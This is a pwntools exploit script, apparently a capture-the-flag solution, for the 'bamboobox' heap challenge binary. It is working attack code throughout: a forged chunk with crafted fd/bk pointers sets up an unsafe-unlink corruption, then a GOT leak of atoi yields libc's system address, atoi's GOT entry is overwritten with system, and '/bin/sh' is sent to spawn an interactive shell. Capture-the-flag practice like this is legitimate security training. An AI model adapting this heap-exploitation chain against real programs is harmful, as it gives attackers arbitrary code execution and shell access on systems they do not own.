from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./bamboobox"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the name of item:",str(content))

def list():
    opt(1)

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of item:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of item:",str(idx))
    p.sendlineafter("Please enter the length of item name:",str(length))
    p.sendlineafter("Please enter the new name of the item:",str(content))

x = 0x6020c8
fake_fd = x-0x18
fake_bk = x-0x10
payload = flat([
    0,0x20,
    fake_fd,fake_bk,
    0x20
    ])
add(0x40-8,payload)
add(0x20-8,"a"*8)
add(0x90-8,"a"*8)
payload = flat([
    0,0,
    0x50,0x90
    ])
edit(1,0x40,payload)
free(2)

payload = flat([
    0,0,0,
    elf.got["atoi"]
    ])

edit(0,0x20,payload)
list()
p.recvuntil("0 : ")
atoi_addr = u64(p.recv(6).ljust(8,"\0"))
system_addr = atoi_addr - libc.sym["atoi"] + libc.sym["system"]
log.success("system_addr is -> "+ hex( system_addr ))

edit(0,8,p64(system_addr))
p.sendline("/bin/sh\x00")
# gdb.attach(p,"set $h=0x603000,$g=0x6020c0")

p.interactive()
